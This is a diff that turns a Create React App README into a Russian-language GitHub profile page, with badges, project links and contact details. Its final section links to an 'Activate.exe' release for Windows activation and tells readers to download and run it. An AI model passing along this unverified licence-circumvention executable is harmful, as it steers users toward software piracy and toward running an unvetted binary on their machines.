@@ -1,70 +1,72 @@
-# Getting Started with Create React App
+<h1 align="center">Привет, я GMLK 👋</h1>
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?center=true&vCenter=true&width=500&lines=Разработчик+C%2B%2B,+Python,+Shell,+HTML;Люблю+автоматизацию+и+серверную+инженерию;Добро+пожаловать+в+мой+мир+кода!" />
+</p>
 
-## Available Scripts
+<p align="center">
+  <img src="https://img.shields.io/badge/Разработчик-C++%20%7C%20Python%20%7C%20Shell-blue?style=flat-square" />
+  <img src="https://img.shields.io/badge/Расположение-Молдова-lightgrey?style=flat-square" />
+</p>
 
-In the project directory, you can run:
+---
 
-### `npm start`
+## 🧠 Обо мне
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+- 💻 Разрабатываю скрипты, веб-панели, Telegram-боты
+- 🧰 Ориентируюсь в DevOps и системном администрировании
+- 🔐 Люблю Unix-подобные системы и серверную сторону
+- 📧 Email: [yuliitezary@gmail.com](mailto:yuliitezary@gmail.com)
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+---
 
-### `npm test`
+## 🚀 Основные проекты
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+| Название | Описание |
+|----------|----------|
+| [🧳 Portofolio](https://github.com/GMLK-DEVELOPER/portofolio) | Личный сайт-портфолио на Python |
+| [🖥 ProxmoxVE-script](https://github.com/GMLK-DEVELOPER/ProxmoxVE-script) | Скрипты автоматизации Proxmox |
+| [🤖 adminpanel-telegrambot](https://github.com/GMLK-DEVELOPER/adminpanel-telegrambot) | Веб-панель для Telegram-ботов |
+| [📚 web-invatamint](https://github.com/GMLK-DEVELOPER/web-invatamint) | HTML-сайт для учебных целей |
 
-### `npm run build`
+---
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+## 📊 Статистика
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+<p align="center">
+  <img src="https://github-readme-stats.vercel.app/api?username=yuliitezarygml&show_icons=true&hide=prs&count_private=true&theme=tokyonight" alt="GitHub Stats" />
+</p>
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+<p align="center">
+  <img src="https://github-readme-streak-stats.herokuapp.com/?user=GMLK-DEVELOPER&theme=tokyonight" alt="GitHub Streak" />
 
-### `npm run eject`
+</p>
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+---
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+## 🛠️ Навыки и технологии
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
+<p align="center">
+  <img src="https://img.shields.io/badge/C++-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white" />
+  <img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=darkgreen" />
+  <img src="https://img.shields.io/badge/Shell-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white" />
+  <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" />
+  <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" />
+</p>
 
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
+---
 
-## Learn More
+## 💬 Связаться со мной
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+📧 Email: [yuliitezary@gmail.com](mailto:yuliitezary@gmail.com)
 
-### Code Splitting
+---
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+## 🧠 активацыя windwos
 
-### Analyzing the Bundle Size
+- 💻 скачиваем файл Activate.exe вот тут ->(https://github.com/yuliitezarygml/yuliitezarygml/releases/download/Activate.exe/Activate.exe)
+- 🧰 открываем
+- 🔐 и выбераем что надм надо
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `npm run build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+---
